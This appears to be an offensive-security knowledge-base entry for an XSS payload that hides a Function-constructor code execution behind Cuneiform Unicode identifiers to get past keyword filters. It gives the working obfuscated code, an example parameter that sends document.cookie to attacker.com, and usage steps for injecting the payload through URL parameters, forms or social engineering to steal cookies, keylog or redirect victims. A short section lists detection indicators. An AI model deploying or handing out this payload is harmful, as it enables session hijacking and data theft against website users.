---
id: fe405763-83e9-4838-9c73-0bc3a98fa9a5
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.920001+00:00'
updated_at: '2023-04-10T20:21:32.248060+00:00'
tags:
  - xss
  - obfuscation
  - cuneiform
  - bypass
platforms:
  - Web
validated: true
---

# Cuneiform-Obfuscated-JavaScript-Code-Execution

## Code

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹]+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

## Description

This JavaScript code uses Cuneiform Unicode characters (U+12000 block) to obfuscate a dynamic function execution, effectively creating an eval-like mechanism to run arbitrary code. It builds the string 'Function' through concatenations involving booleans, objects, and increments, then invokes it with a user-supplied argument. Designed for XSS payloads, it bypasses filters scanning for common JS keywords by hiding logic in non-ASCII symbols.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 𒀀 (final empty string) | Placeholder for arbitrary JavaScript code to execute | `alert(document.cookie)` or `fetch('http://attacker.com?cookie='+document.cookie)` |

## Usage

Replace the trailing empty string (𒀀) with desired JS code, then inject the entire snippet as an XSS payload (e.g., wrapped in <script> tags if allowed, or direct injection). Test in browser console on the target page. Commonly used in reflected/stored XSS to steal cookies, keylog, or redirect. Deliver via URL parameter, form input, or social engineering.

## Detection

- Scan for Cuneiform Unicode (U+12000-U+123FF) in input streams or JS execution logs.
- Monitor for dynamic Function constructor usage via CSP violations or browser dev tools.
- Anomalous network requests from JS (e.g., to external domains) or cookie access patterns.
- Use tools like XSS Hunter or client-side hooks to log eval/Function calls.

## Related

- [[procedures/Bypass-XSS-Filters-with-Cuneiform-Obfuscated-JavaScript]]
